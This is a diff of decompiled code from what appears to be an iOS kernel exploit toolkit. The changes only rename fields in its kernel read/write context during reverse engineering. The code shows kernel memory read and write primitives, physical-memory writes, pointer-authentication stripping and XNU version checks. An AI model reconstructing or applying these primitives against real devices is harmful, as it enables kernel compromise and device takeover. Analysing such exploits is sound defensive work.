       {
@@ -39071,7 +39069,7 @@ void __fastcall sub_35AE0(struct_krwCtx *a1, unsigned int a2, __int64 a3)
   {
     if ( !a3 )
       a3 = -1;
-    v7 = a1->gap191[688] + a1->int168 * (a2 + 1);
+    v7 = a1->gap191[688] + a1->stride168 * (a2 + 1);
     if ( ((vars8 ^ (2 * vars8)) & 0x4000000000000000LL) != 0 )
       __break(0xC471u);
     sub_2A63C(a1, v7, a3);
@@ -39101,7 +39099,7 @@ LABEL_19:
     v9 = 0;
 LABEL_17:
     v10 = a1->gap191[8 * (unsigned __int64)v9 + 9 + a2];
-    v11 = v8 + a1->int168 * (a2 + 1);
+    v11 = v8 + a1->stride168 * (a2 + 1);
     goto LABEL_19;
   }
   v12 = -1;
@@ -39339,7 +39337,7 @@ __int64 __fastcall sub_36160(struct_krwCtx *a1, unsigned int a2, __int64 *a3)
   v7 = result;
   if ( result )
   {
-    result = kread64_outptr(a1, result + a1->int168 * a2, (unsigned __int64 *)&v7);
+    result = kread64_outptr(a1, result + a1->stride168 * a2, (unsigned __int64 *)&v7);
     if ( (_DWORD)result )
     {
       *a3 = v7;
@@ -39720,13 +39718,13 @@ LABEL_72:
           {
             __buf = 0;
             v28 = address + name[1] * v27;
-            __memcpy_chk(&__buf, (const void *)v28, a1->int168, 8u);
+            __memcpy_chk(&__buf, (const void *)v28, a1->stride168, 8u);
             if ( __buf )
             {
               __buf = krw_xpac_vaddr_2(a1, __buf);
               if ( __buf == a2 )
               {
-                v29 = *(_DWORD *)(v28 + a1->int168);
+                v29 = *(_DWORD *)(v28 + a1->stride168);
                 if ( (v29 & 0x10000) != 0 )
                   break;
               }
@@ -39775,10 +39773,10 @@ LABEL_54:
         if ( !v36 )
           return 163884;
         v37 = v36;
-        v38 = a1->int168;
+        v38 = a1->stride168;
         if ( !kread32_outptr((__int64)a1, a2, &v48) )
           return 163855;
-        TRACE_PORTS("sub_36480 notif prep ctx=%llx target=%llx name=%x self_port=%llx off=%x ptr=%llx bits=%x int168=%d\n",
+        TRACE_PORTS("sub_36480 notif prep ctx=%llx target=%llx name=%x self_port=%llx off=%x ptr=%llx bits=%x stride168=%d\n",
                     (unsigned long long)a1,
                     (unsigned long long)a2,
                     name[0],
@@ -39961,7 +39959,7 @@ _QWORD *__fastcall sub_36C10(struct_krwCtx *a1, unsigned int a2)
         if ( kread64_outptr(a1, v11 + 16, &v13)
           && kread64_outptr(a1, v13 + 24, &v13)
           && kread64_outptr(a1, v13 + 32, &v13)
-          && kread64_outptr(a1, v13 + a1->int168, &v13)
+          && kread64_outptr(a1, v13 + a1->stride168, &v13)
           && kread64_outptr(a1, v13 + 24, (unsigned __int64 *)&v12) )
         {
           v12 = validate_addr((__int64)a1, v12);
@@ -41116,11 +41114,11 @@ __int64 __fastcall sub_38158(struct_krwCtx *a1, __int64 a2, int a3, int a4, __in
       }
       else
       {
-        v13 = sub_38D60((__int64)a1, a2 & ~a1->qword188, (void *)address, v10, 1);
+        v13 = sub_38D60((__int64)a1, a2 & ~a1->pageMask, (void *)address, v10, 1);
         v9 = v13;
         if ( !(_DWORD)v13 )
         {
-          v14 = (a1->qword188 & a2) + address;
+          v14 = (a1->pageMask & a2) + address;
           v15 = v27;
           v16 = *(_QWORD *)(v14 + v27);
           if ( v16 && !validate_addr((__int64)a1, v16) )
@@ -41129,7 +41127,7 @@ __int64 __fastcall sub_38158(struct_krwCtx *a1, __int64 a2, int a3, int a4, __in
           }
           else
           {
-            v17 = physwritebuf_direct_mapped(a1, v15 + a2, &v29, a1->int168, 1);
+            v17 = physwritebuf_direct_mapped(a1, v15 + a2, &v29, a1->stride168, 1);
             v9 = v17;
             if ( !(_DWORD)v17 )
             {
@@ -41296,7 +41294,7 @@ __int64 __fastcall sub_385F4(struct_krwCtx *a1, unsigned __int64 a2)
     {
       v7 = result;
       if ( !kread64_outptr(a1, result, &translation_base)
-        || !kread64_outptr(a1, v7 + a1->int168, &translation_delta) )
+        || !kread64_outptr(a1, v7 + a1->stride168, &translation_delta) )
       {
         return 0;
       }
@@ -41330,7 +41328,7 @@ __int64 __fastcall sub_386AC(struct_krwCtx *a1, unsigned __int64 a2)
     {
       v7 = result;
       if ( !kread64_outptr(a1, result, &translation_base)
-        || !kread64_outptr(a1, v7 + a1->int168, &translation_delta) )
+        || !kread64_outptr(a1, v7 + a1->stride168, &translation_delta) )
       {
         return 0;
       }
@@ -41693,7 +41691,7 @@ __int64 __fastcall physwritebuf_direct_mapped(
   result = physmap_map_cached(krwCtx, paddr, (__int64)v10);
   if ( !(_DWORD)result )
   {
-    memcpy((void *)((krwCtx->qword188 & paddr) + v10[0]), buf, size);
+    memcpy((void *)((krwCtx->pageMask & paddr) + v10[0]), buf, size);
     return physmap_unmap_cached((__int64)krwCtx, (__int64)v10);
   }
   return result;
@@ -41788,7 +41786,7 @@ uint64_t __fastcall sub_39090(struct_krwCtx *a1, __int64 a2)
   __int64 v18; // [xsp+28h] [xbp-28h]
 
   v4 = a1->gap191[681];
-  v5 = a1->qword188;
+  v5 = a1->pageMask;
   v6 = a2 & ~v5;
   if ( v4 )
     v7 = v4 == v6;
@@ -41813,7 +41811,7 @@ uint64_t __fastcall sub_39090(struct_krwCtx *a1, __int64 a2)
     v14 = 0;
   if ( !v13 && v14 != 0 )
   {
-    v16 = a1->qword188;
+    v16 = a1->pageMask;
     a1->gap191[681] = a2 & ~v16;
     a1->gap191[682] = v14 & ~v16;
     return v14;
@@ -44841,7 +44839,7 @@ __int64 __fastcall driver_init2_1(struct_krwCtx *krwCtx, int something)
   *(_OWORD *)&krwCtx->gap144[12] = oword10;
   v10 = *((_QWORD *)&xnuVersion.oword10 + 1);
   *(_QWORD *)krwCtx->gap160 = xnuVersion.qword20;
-  krwCtx->int168 = 8;
+  krwCtx->stride168 = 8;
   mach_port_with_a2 = 163847;
   if ( (unsigned __int64)(v10 - XNU_VERSION_PACKED(6153, 0, 103, 0, 0)) > 0xF090EFE400003LL )
     return mach_port_with_a2;
@@ -45067,11 +45065,11 @@ LABEL_86:
       return mach_port_with_a2;
   }
 LABEL_87:
-  v34 = sub_1F114();
+  v34 = sub_get_page_size();
   if ( !v34 )
     return 0x28012;
   krwCtx->pageSizeOrSomething = v34;
-  krwCtx->qword188 = (unsigned int)(v34 - 1);
+  krwCtx->pageMask = (unsigned int)(v34 - 1);
   v35 = krwCtx->xnuMajorVersion;
   if ( v35 > 8791 )
   {
@@ -45360,7 +45358,7 @@ LABEL_233:
     v63 = 0;
     v61 = 0;
 LABEL_255:
-    st_ino = (__int64 *)((char *)st_ino + krwCtx->int168);
+    st_ino = (__int64 *)((char *)st_ino + krwCtx->stride168);
     if ( (unsigned __int64)st_ino >= *(_QWORD *)&v104.st_uid + v104.st_ino )
       return 0;
   }
@@ -45451,7 +45449,7 @@ LABEL_267:
     v77 = sub_1E45C(krwCtx->gap1921[2]);
     if ( !v77 )
       return 163866;
-    if ( !(unsigned int)kreadbuf_last_1(krwCtx, (__int64)v77, krwCtx->int168, &v104) )
+    if ( !(unsigned int)kreadbuf_last_1(krwCtx, (__int64)v77, krwCtx->stride168, &v104) )
       return 163866;
     v71 = *(_QWORD *)&v104.st_dev;
     if ( (v104.st_dev & 1) == 0 )
@@ -45492,7 +45490,7 @@ LABEL_267:
             return 163867;
           v88 = variable_addr;
           mach_port_with_a2 = 163855;
-          if ( !kread64_outptr(krwCtx, variable_addr - 2LL * krwCtx->int168, (unsigned __int64 *)&v104) )
+          if ( !kread64_outptr(krwCtx, variable_addr - 2LL * krwCtx->stride168, (unsigned __int64 *)&v104) )
             return mach_port_with_a2;
           if ( *(_QWORD *)&v104.st_dev )
             goto LABEL_280;
@@ -47482,7 +47480,7 @@ __int64 __fastcall sub_4062C(struct_krwCtx *a1, __int64 a2)
           }
         }
       }
-      v9 += a1->int168;
+      v9 += a1->stride168;
       if ( v9 >= v10 )
         return v2;
     }
@@ -47579,7 +47577,7 @@ __int64 __fastcall sub_4087C(
     v17 = a4;
     v18 = a4;
     v19 = a4;
-    while ( (a1->qword188 & v19) != 0 )
+    while ( (a1->pageMask & v19) != 0 )
     {
       v19 -= (unsigned int)a3;
       v18 += 1LL - (unsigned int)a3;
@@ -47606,7 +47604,7 @@ LABEL_13:
   v22 = sub_1F190();
   if ( a1->xnuVersionPacked <= XNU_VERSION_PACKED(7195, 100, 325, 1023, 1023) )
   {
-    if ( !kreadbuf_last_0((__int64)a1, v33 + (unsigned int)(a1->pageSizeOrSomething * v22), a1->int168, &v34) )
+    if ( !kreadbuf_last_0((__int64)a1, v33 + (unsigned int)(a1->pageSizeOrSomething * v22), a1->stride168, &v34) )
       goto LABEL_50;
     if ( !validate_addr((__int64)a1, v34) )
     {
@@ -47634,7 +47632,7 @@ LABEL_51:
         }
         if ( (unsigned int)sub_1F190() == v28 )
         {
-          v29 = v34 + (v31 - 1) * a1->int168 + 8;
+          v29 = v34 + (v31 - 1) * a1->stride168 + 8;
           goto LABEL_53;
         }
       }
@@ -47651,7 +47649,7 @@ LABEL_50:
     v14 = v12;
     goto LABEL_56;
   }
-  if ( !kreadbuf_last_0((__int64)a1, v33 + (unsigned int)(a1->pageSizeOrSomething * v22) + 8, a1->int168, &v34) )
+  if ( !kreadbuf_last_0((__int64)a1, v33 + (unsigned int)(a1->pageSizeOrSomething * v22) + 8, a1->stride168, &v34) )
     goto LABEL_50;
   if ( !validate_addr((__int64)a1, v34) )
     goto LABEL_49;
@@ -47695,7 +47693,7 @@ LABEL_36:
     if ( !kreadbuf_last_0((__int64)a1, v33 + (unsigned int)(a1->pageSizeOrSomething * v23), 4u, &v31) )
       goto LABEL_50;
   }
-  v29 = v34 + (v31 - 1) * a1->int168;
+  v29 = v34 + (v31 - 1) * a1->stride168;
 LABEL_53:
   if ( kwritebuf_last_0((__int64)a1, v29, &v32, 4u) )
   {
@@ -47764,7 +47762,7 @@ __int64 __fastcall sub_40CBC(
     v13 = 708616;
     goto LABEL_32;
   }
-  if ( !kreadbuf_last_0((__int64)a1, v27 + (unsigned int)(a1->pageSizeOrSomething * v14) + 8, a1->int168, &v28) )
+  if ( !kreadbuf_last_0((__int64)a1, v27 + (unsigned int)(a1->pageSizeOrSomething * v14) + 8, a1->stride168, &v28) )
     goto LABEL_31;
   if ( !validate_addr((__int64)a1, v28) )
   {
@@ -47813,11 +47811,11 @@ LABEL_31:
       goto LABEL_31;
     v28 = v29 | ((unsigned __int64)HIDWORD(v28) << 32);
     v26 = 0;
-    if ( !kreadbuf_last_0((__int64)a1, v28 + a1->int168 * v20, a1->int168, &v26) )
+    if ( !kreadbuf_last_0((__int64)a1, v28 + a1->stride168 * v20, a1->stride168, &v26) )
       goto LABEL_31;
-    if ( validate_addr((__int64)a1, v26 & ~a1->qword188) )
+    if ( validate_addr((__int64)a1, v26 & ~a1->pageMask) )
     {
-      v26 = (v26 & ~a1->qword188) + (a1->qword188 & v26) * a3;
+      v26 = (v26 & ~a1->pageMask) + (a1->pageMask & v26) * a3;
       v22 = v16 - 1;
       v23 = v16 & 0xFFFF0000;
       if ( !v17 )
